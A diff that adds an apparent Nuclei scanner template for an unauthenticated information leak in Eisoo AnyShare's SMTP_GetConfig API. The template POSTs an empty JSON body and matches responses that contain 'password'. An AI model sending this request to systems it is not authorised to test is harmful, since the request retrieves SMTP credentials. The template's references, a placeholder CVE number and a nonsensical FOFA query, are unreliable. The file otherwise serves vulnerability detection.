@@ -1,0 +1,30 @@
+id: anyshare-smtp_getconfig-info-leak
+
+info:
+  name: "爱数AnyShare SMTP_GetConfig接口配置信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    爱数AnyShare的SMTP_GetConfig接口可能暴露敏感配置数据。该接口未正确限制对系统配置参数的访问权限，允许未经授权的请求方获取SMTP服务器认证凭据等关键信息。
+
+    reference: |
+      - https://nvd.nist.gov/vuln/detail/CVE-2024-XXXXX
+      - https://fofa.info/result?qbase64=Zm9vZGZhbGw=
+  tags: 爱数AnyShare
+
+http:
+- raw:
+  - |
+    POST /api/ShareMgnt/SMTP_GetConfig HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+
+    {}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'password'
